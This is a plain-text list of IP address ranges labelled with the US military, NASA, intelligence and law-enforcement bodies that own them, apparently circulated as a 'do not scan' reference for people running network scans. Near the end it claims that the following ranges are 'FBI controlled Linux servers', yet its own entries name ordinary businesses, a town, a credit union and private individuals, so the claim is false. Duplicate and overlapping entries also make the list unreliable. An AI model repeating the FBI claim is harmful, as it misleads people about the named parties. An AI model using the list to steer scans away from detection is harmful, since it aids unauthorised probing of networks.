131.71.0.0 - 131.71.255.255 NAVAL AVIATION DEPOT CHERRY PO
131.74.0.0 Defense MegaCenter Columbus
131.84.0.0 Defense Technical Information Center
131.92.0.0 Army Information Systems Command - Aberdeen (EA)
131.105.0.0 McClellan Air Force Base
131.110.0.0 NASA/Michoud Assembly Facility
131.120.0.0 Naval Postgraduate School
131.121.0.0 United States Naval Academy
131.122.0.0 United States Naval Academy
131.176.0.0 European Space Operations Center
131.182.0.0 NASA Headquarters
131.250.0.0 Office of the Chief of Naval Research

RANGE 132
132.3.0.0 Williams Air Force Base
132.5.0.0 - 132.5.255.255 49th Fighter Wing
132.6.0.0 Ankara Air Station
132.7.0.0 - 132.7.255.255 SSG/SINO
132.9.0.0 28th Bomb Wing
132.10.0.0 319 Comm Sq
132.11.0.0 Hellenikon Air Base
132.12.0.0 Myrtle Beach Air Force Base
132.13.0.0 Bentwaters Royal Air Force Base
132.14.0.0 Air Force Concentrator Network
132.15.0.0 Kadena Air Base
132.16.0.0 Kunsan Air Base
132.17.0.0 Lindsey Air Station
132.18.0.0 McGuire Air Force Base
132.19.0.0 100CS (NET-MILDENHALL)
132.20.0.0 35th Communications Squadron
132.21.0.0 Plattsburgh Air Force Base
132.22.0.0 23Communications Sq
132.24.0.0 Dover Air Force Base
132.25.0.0 786 CS/SCBM
132.27.0.0 - 132.27.255.255 39CS/SCBBN
132.28.0.0 14TH COMMUNICATION SQUADRON
132.30.0.0 Lajes Air Force Base
132.31.0.0 Loring Air Force Base
132.33.0.0 60CS/SCSNM
132.34.0.0 Cannon Air Force Base
132.35.0.0 Altus Air Force Base
132.37.0.0 75 ABW
132.38.0.0 Goodfellow AFB
132.39.0.0 K.I. Sawyer Air Force Base
132.40.0.0 347 COMMUNICATION SQUADRON
132.42.0.0 Spangdahlem Air Force Base
132.43.0.0 Zweibruchen Air Force Base
132.45.0.0 Chanute Air Force Base
132.46.0.0 Columbus Air Force Base
132.48.0.0 Laughlin Air Force Base
132.49.0.0 366CS/SCSN
132.50.0.0 Reese Air Force Base
132.52.0.0 Vance Air Force Base
132.54.0.0 Langley AFB
132.55.0.0 Torrejon Air Force Base
132.56.0.0 - 132.56.255.255 9 CS/SC
132.57.0.0 Castle Air Force Base
132.58.0.0 Nellis Air Force Base
132.59.0.0 24Comm SquadronSCSNA
132.60.0.0 - 132.60.255.255 42ND COMMUNICATION SQUADRON
132.61.0.0 SSG/SIN
132.62.0.0 - 132.62.255.255 377 COMMUNICATION SQUADRON
132.79.0.0 Army National Guard Bureau
132.80.0.0 - 132.80.255.255 NGB-AIS-OS
132.80.0.0 - 132.85.255.255 National Guard Bureau
132.82.0.0 Army National Guard Bureau
132.86.0.0 National Guard Bureau
132.87.0.0 - 132.93.255.255 National Guard Bureau
132.94.0.0 Army National Guard Bureau
132.95.0.0 - 132.103.255.255 National Guard Bureau
132.95.0.0 - 132.108.0.0 DOD Network Information Center
132.104.0.0 - 132.104.255.255 Army National Guard Bureau
132.105.0.0 - 132.108.255.255 Army National Guard Bureau
132.109.0.0 National Guard Bureau
132.110.0.0 - 132.116.255.255 Army National Guard Bureau
132.114.0.0 Army National Guard
132.117.0.0 Army National Guard Bureau
132.118.0.0 - 132.132.0.0 Army National Guard Bureau
132.122.0.0 South Carolina Army National Guard, USPFO
132.133.0.0 National Guard Bureau
132.134.0.0 - 132.143.255.255 National Guard Bureau
132.159.0.0 Army Information Systems Command
132.193.0.0 Army Research Office
132.250.0.0 Naval Research Laboratory
RANGE 134
134.5.0.0 Lockheed Aeronautical Systems Company
134.11.0.0 The Pentagon
134.12.0.0 NASA Ames Research Center
134.51.0.0 Boeing Military Aircraft Facility
134.52.*.* Boeing Corporation
134.78.0.0 Army Information Systems Command-ATCOM
134.80.0.0 Army Information Systems Command
134.118.0.0 NASA/Johnson Space Center
134.131.0.0 Wright-Patterson Air Force Base
134.136.0.0 Wright-Patterson Air Force Base
134.164.0.0 Army Engineer Waterways Experiment Station
134.165.0.0 Headquarters Air Force Space Command
134.194.0.0 U.S. Army Aberdeen Test Center
134.205.0.0 7th Communications Group
134.207.0.0 Naval Research Laboratory
134.229.0.0 Navy Regional Data Automation Center
134.230.0.0 Navy Regional Data Automation Center
134.232.0.0 - 134.232.255.255 U.S. Army, Europe
134.233.0.0 HQ 5th Signal Command
134.234.0.0 - 134.234.255.255 Southern European Task Force
134.235.0.0 HQ 5th Signal Command
134.240.0.0 U.S. Military Academy
136.149.0.0 Air Force Military Personnel Center

RANGE 136
136.178.0.0 NASA Research Network
136.188.0.0 - 136.197.255.255 Defense Intelligence Agency
136.207.0.0 69th Signal Battalion
136.208.0.0 HQ, 5th Signal Command
136.209.0.0 HQ 5th Signal Command
136.210.0.0 HQ 5th Signal Command
136.212.0.0 HQ 5th Signal Command
136.213.0.0 HQ, 5th Signal Command
136.214.0.0 HQ, 5th Signal Command
136.215.0.0 HQ, 5th Signal Command
136.216.0.0 HQ, 5th Signal Command
136.217.0.0 HQ, 5th Signal Command
136.218.0.0 HQ, 5th Signal Command
136.219.0.0 HQ, 5th Signal Command
136.220.0.0 HQ, 5th Signal Command
136.221.0.0 HQ, 5th Signal Command
136.222.0.0 HQ, 5th Signal Command


RANGE 137
137.1.0.0 Whiteman Air Force Base
137.2.0.0 George Air Force Base
137.3.0.0 Little Rock Air Force Base
137.4.0.0 - 137.4.255.255 437 CS/SC
137.5.0.0 Air Force Concentrator Network
137.6.0.0 Air Force Concentrator Network
137.11.0.0 HQ AFSPC/SCNNC
137.12.0.0 Air Force Concentrator Network
137.17.* National Aerospace Laboratory
137.24.0.0 Naval Surface Warfare Center
137.29.0.0 First Special Operations Command
137.67.0.0 Naval Warfare Assessment Center
137.94.* Royal Military College
137.95.* Headquarters, U.S. European Command
137.126.0.0 USAF MARS
137.127.* Army Concepts Analysis Agency
137.128.* U.S. ARMY Tank-Automotive Command
137.130.0.0 Defense Information Systems Agency
137.209.0.0 Defense Information Systems Agency
137.210.0.0 Defense Information Systems Agency
137.211.0.0 Defense Information Systems Agency
137.212.0.0 Defense Information Systems Agency
137.231.0.0 HQ 5th Signal Command
137.232.0.0 Defense Information Systems Agency
137.233.0.0 Defense Information Systems Agency
137.234.0.0 Defense Information Systems Agency
137.235.0.0 Defense Information Systems Agency
137.240.0.0 Air Force Materiel Command
137.241.0.0 75 ABW
137.242.0.0 Air Force Logistics Command
137.243.0.0 77 CS/SCCN
137.244.0.0 78 CS/SCSC
137.245.0.0 Wright Patterson Air Force Base
137.246.0.0 United States Atlantic Command Joint Training

RANGE 138
138.13.0.0 Air Force Systems Command
138.27.0.0 Army Information Systems Command
138.50.0.0 HQ 5th Signal Command
138.65.0.0 HQ, 5th Signal Command
138.76.0.0 NASA Headquarters
138.109.0.0 Naval Surface Warfare Center
138.115.0.0 NASA Information and Electronic Systems Laboratory
138.135.0.0 - 138.135.255.255 DEFENSE PROCESSING CENTERPERAL HARBOR
138.136.0.0 - 138.136.255.255 Navy Computers and Telecommunications Station
138.137.0.0 Navy Regional Data Automation Center (NARDAC)
138.139.0.0 Marine Corps Air Station
138.140.0.0 Navy Regional Data Automation Center
138.141.0.0 Navy Regional Data Automation Center
138.142.0.0 Navy Regional Data Automation Center
138.143.0.0 Navy Regional Data Automation Center
138.144.0.0 NAVCOMTELCOM
138.145.0.0 NCTS WASHINGTON
138.146.0.0 NCTC
138.147.0.0 NCTC
138.148.0.0 NCTC
138.149.0.0 NCTC
138.150.0.0 NCTC
138.151.0.0 NCTC
138.152.0.0 NCTC
138.153.0.0 Yokosuka Naval Base
138.154.0.0 NCTC
138.155.0.0 NCTC
138.156.0.0 Marine Corps Central Design & Prog. Activity
138.157.0.0 - 138.157.255.255 Marine Corps Central Design & Prog. Activity
138.158.0.0 Marine Corps Central Design & Prog. Activity
138.159.0.0 NCTC
138.160.0.0 Naval Air Station
138.161.0.0 NCTC
138.162.0.0 NCTC
138.163.0.0 NCTC
138.164.0.0 NCTC
138.165.0.0 NCTC
138.166.0.0 NCTC
138.167.0.0 NOC, MCTSSA, East
138.168.0.0 Marine Corps Central Design & Prog. Activity
138.169.0.0 NAVAL COMPUTER AND TELECOMM
138.169.12.0 NAVAL COMPUTER AND TELECOMM
138.169.13.0 NAVAL COMPUTER AND TELECOMM
138.170.0.0 NCTC
138.171.0.0 NCTC
138.172.0.0 NCTC
138.173.0.0 NCTC
138.174.0.0 NCTC
138.175.0.0 NCTC
138.176.0.0 NCTC
138.177.0.0 NCTS Pensacola
138.178.0.0 NCTC
138.179.0.0 NCTC
138.180.0.0 NCTC
138.181.0.0 NCTC
138.182.0.0 CNO N60
138.183.0.0 NCTC
138.184.0.0 NCTS
138.193.0.0 NASA/Yellow Creek

RANGE 139
139.31.0.0 20th Tactical Fighter Wing
139.32.0.0 48th Tactical Fighter Wing
139.33.0.0 36th Tactical Fighter Wing
139.34.0.0 52nd Tactical Fighter Wing
139.35.0.0 50th Tactical Fighter Wing
139.36.0.0 66th Electronic Combat Wing
139.37.0.0 26th Tactical Reconnaissance Wing
139.38.0.0 32nd Tactical Fighter Squadron
139.39.0.0 81st Tactical Fighter Wing
139.40.0.0 10th Tactical Fighter Wing
139.41.0.0 39th Tactical Air Control Group
139.42.0.0 40th Tactical Air Control Group
139.43.0.0 401st Tactical Fighter Wing
139.124.* Reseau Infomratique
139.142.*.*

RANGE 140
140.1.0.0 Defense Information Systems Agency
140.3.0.0 Defense Information Systems Agency
140.4.0.0 Defense Information Systems Agency
140.5.0.0 Defense Information Systems Agency
140.6.0.0 Defense Information Systems Agency
140.7.0.0 Defense Information Systems Agency
140.8.0.0 Defense Information Systems Agency
140.9.0.0 Defense Information Systems Agency
140.10.0.0 Defense Information Systems Agency
140.11.0.0 Defense Information Systems Agency
140.12.0.0 Defense Information Systems Agency
140.13.0.0 Defense Information Systems Agency
140.14.0.0 DISA Columbus Level II NOC
140.15.0.0 Defense Information Systems Agency
140.16.0.0 Defense Information Systems Agency
140.17.0.0 Defense Information Systems Agency
140.18.0.0 Defense Information Systems Agency
140.19.0.0 Defense Information Systems Agency
140.20.0.0 Defense Information Systems Agency
140.21.0.0 Defense Information Systems Agency
140.22.0.0 Defense Information Systems Agency
140.23.0.0 Defense Information Systems Agency
140.24.0.0 ASIC ALLIANCE-MARLBORO
140.25.0.0 Defense Information Systems Agency
140.26.0.0 Defense Information Systems Agency
140.27.0.0 Defense Information Systems Agency
140.28.0.0 Defense Information Systems Agency
140.29.0.0 Defense Information Systems Agency
140.30.0.0 Defense Information Systems Agency
140.31.0.0 Defense Information Systems Agency
140.32.0.0 Defense Information Systems Agency
140.33.0.0 Defense Information Systems Agency
140.34.0.0 Defense Information Systems Agency
140.35.0.0 Defense Information Systems Agency
140.36.0.0 Defense Information Systems Agency
140.37.0.0 Defense Information Systems Agency
140.38.0.0 Defense Information Systems Agency
140.39.0.0 Defense Information Systems Agency
140.40.0.0 Defense Information Systems Agency
140.41.0.0 Defense Information Systems Agency
140.42.0.0 Defense Information Systems Agency
140.43.0.0 Defense Information Systems Agency
140.44.0.0 Defense Information Systems Agency
140.45.0.0 Defense Information Systems Agency
140.46.0.0 Defense Information Systems Agency
140.47.0.0 - 140.47.255.255 Defense Information Systems Agency
140.47.0.0 - 140.48.255.255 DOD Network Information Center
140.48.0.0 - 140.48.255.255 Defense Information Systems Agency
140.49.0.0 Defense Information Systems Agency
140.50.0.0 Defense Information Systems Agency
140.51.0.0 Defense Information Systems Agency
140.52.0.0 Defense Information Systems Agency
140.53.0.0 Defense Information Systems Agency
140.54.0.0 Defense Information Systems Agency
140.55.0.0 Defense Information Systems Agency
140.56.0.0 Defense Information Systems Agency
140.57.0.0 Defense Information Systems Agency
140.58.0.0 Defense Information Systems Agency
140.59.0.0 Defense Information Systems Agency
140.60.0.0 Defense Information Systems Agency
140.61.0.0 Defense Information Systems Agency
140.62.0.0 Defense Information Systems Agency
140.63.0.0 Defense Information Systems Agency
140.64.0.0 Defense Information Systems Agency
140.65.0.0 Defense Information Systems Agency
140.66.0.0 Defense Information Systems Agency
140.67.0.0 Defense Information Systems Agency
140.68.0.0 Defense Information Systems Agency
140.69.0.0 Defense Information Systems Agency
140.70.0.0 Defense Information Systems Agency
140.71.0.0 Defense Information Systems Agency
140.72.0.0 Defense Information Systems Agency
140.73.0.0 Defense Information Systems Agency
140.74.0.0 - 140.74.255.255 Defense Information Systems Agency
140.100.0.0 Naval Sea Systems Command
140.139.0.0 HQ US Army Medical Research and Development Command
140.154.0.0 HQ 5th Signal Command
140.155.0.0 HQ, 5th Signal Command
140.156.0.0 HQ, 5th Signal Command
140.175.0.0 Scott Air Force Base
140.178.0.0 Naval Undersea Warfare Center Division, Keyport
140.187.0.0 Fort Bragg
140.194.0.0 US Army Corps of Engineers
140.195.0.0 Naval Sea Systems Command
140.199.0.0 Naval Ocean Systems Center
140.201.0.0 HQ, 5th Signal Command
140.202.0.0 106TH SIGNAL BRIGADE

RANGE 143
143.45.0.0 58th Signal Battalion
143.46.0.0 U.S. Army, 1141st Signal Battalion
143.68.0.0 Headquarters, USAISC
143.69.0.0 Headquarters, USAAISC
143.70.0.0 Headquarters, USAAISC
143.71.0.0 Headquarters, USAAISC
143.72.0.0 Headquarters, USAAISC
143.73.0.0 Headquarters, USAAISC
143.74.0.0 Headquarters, USAAISC
143.75.0.0 Headquarters, USAAISC
143.76.0.0 Headquarters, USAAISC
143.77.0.0 Headquarters, USAAISC
143.78.0.0 Headquarters, USAAISC
143.79.0.0 Headquarters, USAAISC
143.80.0.0 Headquarters, USAAISC
143.81.0.0 Headquarters, USAAISC
143.82.0.0 Headquarters, USAAISC
143.84.0.0 Headquarters, USAAISC
143.85.0.0 Headquarters, USAAISC
143.86.0.0 Headquarters, USAAISC
143.87.0.0 Headquarters, USAAISC
143.232.0.0 NASA Ames Research Center

RANGE 144
144.99.0.0 United States Army Information Systems Command
144.109.0.0 Army Information Systems Command
144.143.0.0 Headquarters, Third United States Army
144.144.0.0 Headquarters, Third United States Army
144.146.0.0 Commander, Army Information Systems Center
144.147.0.0 Commander, Army Information Systems Center
144.170.0.0 HQ, 5th Signal Command
144.192.0.0 United States Army Information Services Command-Campbell
144.233.0.0 Defense Intelligence Agency
144.234.0.0 Defense Intelligence Agency
144.235.0.0 Defense Intelligence Agency
144.236.0.0 Defense Intelligence Agency
144.237.0.0 Defense Intelligence Agency
144.238.0.0 Defense Intelligence Agency
144.239.0.0 Defense Intelligence Agency
144.240.0.0 Defense Intelligence Agency
144.241.0.0 Defense Intelligence Agency
144.242.0.0 Defense Intelligence Agency
144.252.0.0 U.S. Army LABCOM

RANGE 146
146.17.0.0 HQ, 5th Signal Command
146.80.0.0 Defence Research Agency
146.98.0.0 HQ United States European Command
146.154.0.0 NASA/Johnson Space Center
146.165.0.0 NASA Langley Research Center

RANGE 147
147.35.0.0 HQ, 5th Signal Command
147.36.0.0 HQ, 5th Signal Command
147.37.0.0 HQ, 5th Signal Command
147.38.0.0 HQ, 5th Signal Command
147.39.0.0 HQ, 5th Signal Command
147.40.0.0 HQ, 5th Signal Command
147.42.0.0 Army CALS Project
147.103.0.0 Army Information Systems Software Center
147.104.0.0 Army Information Systems Software Center
147.159.0.0 Naval Air Warfare Center, Aircraft Division
147.168.0.0 Naval Surface Warfare Center
147.169.0.0 HQ, 5th Signal Command
147.198.0.0 Army Information Systems Command
147.199.0.0 Army Information Systems Command
147.238.0.0 Army Information Systems Command
147.239.0.0 1112th Signal Battalion
147.240.0.0 US Army Tank-Automotive Command
147.242.0.0 19th Support Command
147.248.0.0 Fort Monroe DOIM
147.254.0.0 7th Communications Group

RANGE 148
148.114.0.0 NASA, Stennis Space Center

RANGE 150
150.113.0.0 1114th Signal Battalion
150.114.0.0 1114th Signal Battalion
150.125.0.0 Space and Naval Warfare Command
150.133.0.0 10th Area Support Group
150.144.0.0 NASA Goodard Space Flight Center
150.149.0.0 Army Information Systems Command
150.157.0.0 USAISC-Fort Lee
150.184.0.0 Fort Monroe DOIM
150.190.0.0 USAISC-Letterkenny
150.196.0.0 USAISC-LABCOM

RANGE 152
152.82.0.0 7th Communications Group of the Air Force
152.151.0.0 U.S. Naval Space & Naval Warfare Systems Command
152.152.0.0 NATO Headquarters
152.154.0.0 Defense Information Systems Agency
152.229.0.0 Defense MegaCenter (DMC) Denver

RANGE 153
153.21.0.0 USCENTAF/SCM
153.22.0.0 USCENTAF/SCM
153.23.0.0 USCENTAF/SCM
153.24.0.0 USCENTAF/SCM
153.25.0.0 USCENTAF/SCM
153.26.0.0 USCENTAF/SCM
153.27.0.0 USCENTAF/SCM
153.28.0.0 USCENTAF/SCM
153.29.0.0 USCENTAF/SCM
153.30.0.0 USCENTAF/SCM
153.31.0.0 Federal Bureau of Investigation

RANGE 155
155.5.0.0 1141st Signal Bn
155.6.0.0 1141st Signal Bn
155.7.0.0 American Forces Information
155.8.0.0 U.S. ArmyFort Gordon
155.9.0.0 - 155.9.255.255 United States Army Information Systems Command
155.74.0.0 PEO STAMIS
155.75.0.0 US Army Corps of Engineers
155.76.0.0 PEO STAMIS
155.77.0.0 PEO STAMIS
155.78.0.0 PEO STAMIS
155.79.0.0 US Army Corps of Engineers
155.80.0.0 PEO STAMIS
155.81.0.0 PEO STAMIS
155.82.0.0 PEO STAMIS
155.83.0.0 US Army Corps of Enginers
155.84.0.0 PEO STAMIS
155.85.0.0 PEO STAMIS
155.86.0.0 US Army Corps of Engineers
155.87.0.0 PEO STAMIS
155.88.0.0 PEO STAMIS
155.96.0.0 Drug Enforcement Administration
155.149.0.0 1112th Signal Battalion
155.155.0.0 HQ, 5th Signal Command
155.178.0.0 Federal Aviation Administration
155.213.0.0 USAISC Fort Benning
155.214.0.0 Director of Information Management
155.215.0.0 USAISC-FT DRUM
155.216.0.0 TCACCIS Project Management Office
155.217.0.0 Directorate of Information Management
155.218.0.0 USAISC
155.219.0.0 DOIM/USAISC Fort Sill
155.220.0.0 USAISC-DOIM
155.221.0.0 USAISC-Ft Ord

RANGE 156
156.9.0.0 U. S. Marshals Service

RANGE 157
157.150.0.0 United Nations
157.153.0.0 COMMANDER NAVAL SURFACE U.S. PACIFIC FLEET
157.202.0.0 US Special Operations Command
157.217.0.0 U. S. Strategic Command

RANGE 158
158.1.0.0 Commander, Tooele Army Depot
158.2.0.0 USAMC Logistics Support Activity
158.3.0.0 U.S. Army TACOM
158.4.0.0 UASISC Ft. Carson
158.5.0.0 1112th Signal Battalion
158.6.0.0 USAISC-Ft. McCoy
158.7.0.0 USAISC-FLW
158.8.0.0 US Army Soldier Support Center
158.9.0.0 USAISC-CECOM
158.10.0.0 GOC
158.11.0.0 UASISC-Vint Hill
158.12.0.0 US Army Harry Diamond Laboratories
158.13.0.0 USAISC DOIM
158.14.0.0 1112th Signal Battalion
158.15.0.0 - 158.15.255.255 Defense Megacenter Huntsville
158.16.0.0 Rocky Mountain Arsenal (PMRMA)
158.17.0.0 Crane Army Ammunition Activity
158.18.0.0 Defense Finance & Accounting Service Center
158.19.0.0 DOIM
158.20.0.0 DOIM
158.235.0.0 Marine Corps Central Design and Programming Activity
158.243.0.0 Marine Corps Central Design and Programming Activity
158.244.0.0 Marine Corps Central Design and Programming Activity
158.245.0.0 Marine Corps Central Design and Programming Activity
158.246.0.0 Marine Corps Central Design and Programming Activity

RANGE 159
159.120.0.0 Naval Air Systems Command (Air 4114)

RANGE 160
160.132.0.0 US Army Recruiting Command
160.135.0.0 36th Signal BN
160.138.0.0 USAISC
160.139.0.0 USAISC
160.140.0.0 HQ, United States Army
160.143.0.0 USAISC
160.145.0.0 1101st Signal Brigade
160.146.0.0 USAISC SATCOMSTA-CAMP ROBERTS
160.150.0.0 Commander, Moncrief Army Hospital

RANGE 161
161.124.0.0 NAVAL WEAPONS STATION

RANGE 162
162.32.0.0 Naval Aviation Depot Pensacola
162.45.0.0 Central Intelligence Agency
162.46.0.0 Central Intelligence Agency

RANGE 163
163.205.0.0 NASA Kennedy Space Center
163.206.0.0 NASA Kennedy Space Center

RANGE 164
164.45.0.0 Naval Ordnance Center, Pacific Division
164.49.0.0 United States Army Space and Strategic Defense
164.158.0.0 Naval Surface Warfare Center
164.217.0.0 Institute for Defense Analyses
164.218.0.0 Bureau of Naval Personnel
164.219.0.0 HQ USAFE WARRIOR PREPARATION CENTER
164.220.0.0 - 164.220.255.255 NIMIP/TIP/NEWNET
164.221.0.0 - 164.221.255.255 Information Technology
164.223.0.0 Naval Undersea Warfare Center
164.224.0.0 Secretary of the Navy
164.225.0.0 U.S. Army Intelligence and Security Command
164.226.0.0 Naval Exchange Service Command
164.227.0.0 Naval Surface Warfare Center, Crane Division
164.228.0.0 USCINCPAC J21T
164.229.0.0 NCTS-NOLA
164.230.0.0 Naval Aviation Depot
164.231.0.0 Military Sealift Command
164.232.0.0 - 164.232.255.255 United States Southern Command

RANGE 167
167.44.0.0 Government Telecommunications Agency

RANGE 168
168.68.0.0 USDA Office of Operations
168.85.0.0 Fort Sanders Alliance
168.102.0.0 Indiana Purdue Fort Wayne

RANGE 169
169.252.0.0 - 169.253.0.0 U.S. Department of State

RANGE 194

RANGE 195
195.10.* Various - Do not scan

RANGE 199
199.121.4.0 - 199.121.253.0 Naval Air Systems Command, VA

RANGE 203
203.59.0.0 - 203.59.255.255 Perth Australia iiNET

RANGE 204
204.34.0.0 - 204.34.15.0 IPC JAPAN
204.34.0.0 - 204.37.255.0 DOD Network Information Center
204.34.16.0 - 204.34.27.0 Bureau of Medicine and Surgery
204.34.32.0 - 204.34.63.0 USACOM
204.34.64.0 - 204.34.115.0 DEFENSE FINANCE AND ACCOUNTING SERVICE
204.34.128.0 DISA-Eucom / BBN-STD, Inc.
204.34.129.0 Defense Technical Information Center
204.34.130.0 GSI
204.34.131.0 NSA NAPLES ITALY
204.34.132.0 NAVSTA ROTA SPAIN
204.34.133.0 NAS SIGONELLA ITALY
204.34.134.0 Naval Air Warfare Center Aircraft Division
204.34.135.0 GSI
204.34.136.0 Naval Undersea Warfare Center USRD - Orlando
204.34.137.0 Joint Spectrum Center
204.34.138.0 GSI
204.34.139.0 HQ, JFMO Korea, Headquarters
204.34.140.0 DISA D75
204.34.141.0 U. S. Naval Air Facility, Atsugi Japan
204.34.142.0 Naval Enlisted Personnel Management Center
204.34.143.0 Afloat Training Group Pacific
204.34.144.0 HQ Special Operations Command - Europe
204.34.145.0 Commander Naval Base Pearl Harbor
204.34.147.0 NAVSEA Information Management Improvement Program
204.34.148.0 Q112
204.34.149.0 Ctr. for Info. Sys.Security,CounterMeasures
204.34.150.0 Resource Consultants, Inc.
204.34.151.0 Personnel Support Activity, San Diego
204.34.152.0 NAVAL AIR FACILITY, ADAK
204.34.153.0 NAVSEA Logistics Command Detachment
204.34.154.0 PEARL HARBOR NAVAL SHIPYARD
204.34.155.0 PEARL HARBOR NAVAL SHIPYARD
204.34.156.0 Defense Photography School
204.34.157.0 - 204.34.160.0 Defense Information School
204.34.161.0 Naval Air Systems Command
204.34.162.0 Puget Sound Naval Shipyard
204.34.163.0 Joint Precision Strike Demonstration
204.34.164.0 Naval Pacific Meteorology and Ocean
204.34.165.0 Joint Precision Strike Demonstration
204.34.167.0 USAF
204.34.168.0 Commander
204.34.169.0 Naval Air Warfare Center
204.34.170.0 Naval Air Systems Command
204.34.171.0 NAVSTA SUPPLY DEPARTMENT
204.34.173.0 SUBMEPP Activity
204.34.174.0 COMMANDER TASK FORCE 74 YOKOSUKA JAPAN
204.34.176.0 DISA-PAC,IPC-GUAM
204.34.177.0 Satellite Production Test Center
204.34.181.0 940 Air Refueling Wing
204.34.182.0 Defense Megacenter Warner Robins
204.34.183.0 GCCS Support Facility
204.34.184.0 Nav Air Tech Serv Facility-Detachment
204.34.185.0 NAVAL SUPPORT FACILITY, DIEGO GARCIA
204.34.186.0 Defense Logistics Agency - Europe
204.34.187.0 NAVMASSO
204.34.188.0 Commander-In-Chief, US Pacific Fleet
204.34.189.0 Defense MegaCenter - St Louis
204.34.190.0 NAVMASSO
204.34.192.0 HQ SOCEUR
204.34.193.0 Second Marine Expeditionary Force
204.34.194.0 Second Marine Expeditionary Force
204.34.195.0 Second Marine Expeditionary Force
204.34.196.0 NAVCOMTELSTAWASHDC
204.34.197.0 INFORMATION SYSTEMS TECHNOLOGY CENTER
204.34.198.0 Naval Observatory Detachment, Colorado
204.34.199.0 NAVILCODETMECH
204.34.200.0 Navy Environmental Preventive Medicine
204.34.201.0 Port Hueneme Division, Naval Surf
204.34.202.0 Naval Facilities Engineering Housing
204.34.203.0 NAVSEA Logistics Command Detachment
204.34.204.0 Naval Air Warfare Center
204.34.205.0 Portsmouth Naval Shipyard
204.34.206.0 INFORMATION SYSTEMS TECHNOLOGY CENTER
204.34.208.0 - 204.34.210.0 Military Sealift Command Pacific
204.34.211.0 USAF Academy
204.34.212.0 3rd Combat Service Support
204.34.213.0 1st Radio Battalion
204.34.214.0 OASD (Health Affairs)
204.34.215.0 Second Marine Expeditionary Force
204.34.216.0 1st Marine Air Wing
204.34.217.0 SA-ALC/LTE
204.34.218.0 3rd Marine
204.34.219.0 Communications and Electronics
204.34.220.0 G-6 Operations
204.34.221.0 G-6 Operations
204.34.222.0 G-6 Operations
204.34.223.0 G-6 Operations
204.34.224.0 G-6 Operations
204.34.225.0 Joint Interoperability Test Command
204.34.226.0 NAVMASSO
204.34.227.0 NAVMASSO
204.34.228.0 - 204.34.228.255 Field Command Defense Nuclear Agency
204.34.229.0 Naval Space Command
204.34.230.0 Naval Pacific Meteorology and Oceanography
204.34.232.0 Military Family Housing
204.34.233.0 - 204.34.233.255 Navy Material Transportation Office
204.34.234.0 NAVMASSO
204.34.235.0 Defense Finance and Accounting Service
204.34.237.0 European Stars and Stripes
204.34.238.0 Pacific Stars and Stripes
204.34.239.0 PUGET SOUND NAVAL SHIPYARD
204.34.240.0 Nval Station, Guantanamo Bay
204.34.242.0 COMNAVSURFPAC
204.34.243.0 NAVMASSO
204.34.244.0 Amphibious Force, Seventh Fleet, U. S. Navy
204.34.245.0 USAF SpaceCommand
204.34.246.0 USAF
204.34.247.0 U.S. Army Special Operations Command
204.34.248.0 FLEET COMBAT TRAINING CENTER ATLA
204.34.249.0 Naval Aviation Depot North Island
204.34.250.0 NAVMASSO
204.34.251.0 NAVSEA Log Command Detachment Pacific
204.34.252.0 Command Special Boat Squadron One
204.34.253.0 AFPCA/GNNN
204.34.254.0 Navy Environmental Preventive Medicine

RANGE 205
205.0.0.0 - 205.117.255.0 Department of the Navy, Space and Naval Warfare System Command, Washington DC - SPAWAR
205.96.* - 205.103.*

RANGE 207
207.30.* Sprint/United Telephone of Florida

All the below are FBI controlled Linux servers & IPs/IP-Ranges

207.60.0.0 - 207.60.255.0 The Internet Access Company
207.60.2.128 - 207.60.2.255 Abacus Technology
207.60.3.0 - 207.60.3.127 Mass Electric Construction Co.
207.60.3.128 - 207.60.3.255 Peabody Proberties Inc
207.60.4.0 - 207.60.4.127 Northern Electronics
207.60.4.128 - 207.60.4.255 Posternak, Blankstein & Lund
207.60.5.64 - 207.60.5.127 Woodard & Curran
207.60.5.192 - 207.60.5.255 On Line Services
207.60.6.0 - 207.60.6.63 The 400 Group
207.60.6.64 - 207.60.6.127 RD Hunter and Company
207.60.6.128 - 207.60.6.191 Louis Berger and Associates
207.60.6.192 - 207.60.6.255 Ross-Simons
207.60.7.0 - 207.60.7.63 Eastern Cambridge Savings Bank
207.60.7.64 - 207.60.7.127 Greater Lawrence Community Action Committee
207.60.7.128 - 207.60.7.191 Data Electronic Devices, Inc
207.60.8.0 - 207.60.8.255 Sippican
207.60.9.0 - 207.60.9.31 Alps Sportswear Mfg Co
207.60.9.32 - 207.60.9.63 Escher Group Ltd
207.60.9.64 - 207.60.9.95 West Suburban Elder
207.60.9.96 - 207.60.9.127 Central Bank
207.60.9.128 - 207.60.9.159 Danick Systems
207.60.9.160 - 207.60.9.191 Alps Sportswear Mfg CO
207.60.9.192 - 207.60.9.223 BSCC
207.60.13.16 - 207.60.13.23 Patrons Insurance Group
207.60.13.40 - 207.60.13.47 Athera Technologies
207.60.13.48 - 207.60.13.55 Service Edge Partners Inc
207.60.13.56 - 207.60.13.63 Massachusetts Credit Union League
207.60.13.64 - 207.60.13.71 SierraCom
207.60.13.72 - 207.60.13.79 AI/ FOCS
207.60.13.80 - 207.60.13.87 Extreme soft
207.60.13.96 - 207.60.13.103 Eaton Seo Corp
207.60.13.112 - 207.60.13.119 C. White
207.60.13.120 - 207.60.13.127 Athera
207.60.13.128 - 207.60.13.135 Entropic Systems, INC
207.60.13.136 - 207.60.13.143 Wood Product Manufactureds Associates
207.60.13.160 - 207.60.13.167 Jamestown Distribution
207.60.13.168 - 207.60.13.175 C&M Computers
207.60.13.176 - 207.60.13.183 ABC Used Auto Parts
207.60.13.184 - 207.60.13.191 Tomas Weldon
207.60.13.192 - 207.60.13.199 Tage Inns
207.60.13.200 - 207.60.13.207 Control Module Inc
207.60.13.208 - 207.60.13.215 Hyper Crawler Information Systems
207.60.13.216 - 207.60.13.223 Eastern Bearings
207.60.13.224 - 207.60.13.231 North Shore Data Services
207.60.13.232 - 207.60.13.239 Mas New Hampshire
207.60.14.0 - 207.60.14.255 J. A. Webster
207.60.15.0 - 207.60.15.127 Trilogic
207.60.16.0 - 207.60.16.255 Area 54
207.60.18.0 - 207.60.18.63 Vested Development Inc
207.60.18.64 - 207.60.18.127 Conventures
207.60.21.0 - 207.60.21.255 Don Law Company
207.60.22.0 - 207.60.22.255 Advanced Microsensors
207.60.28.0 - 207.60.28.63 Applied Business Center
207.60.28.64 - 207.60.28.127 Color and Design Exchange
207.60.36.8 - 207.60.36.15 Shaun McCusker
207.60.36.16 - 207.60.36.23 Town of Framingham
207.60.36.24 - 207.60.36.31 AB Software
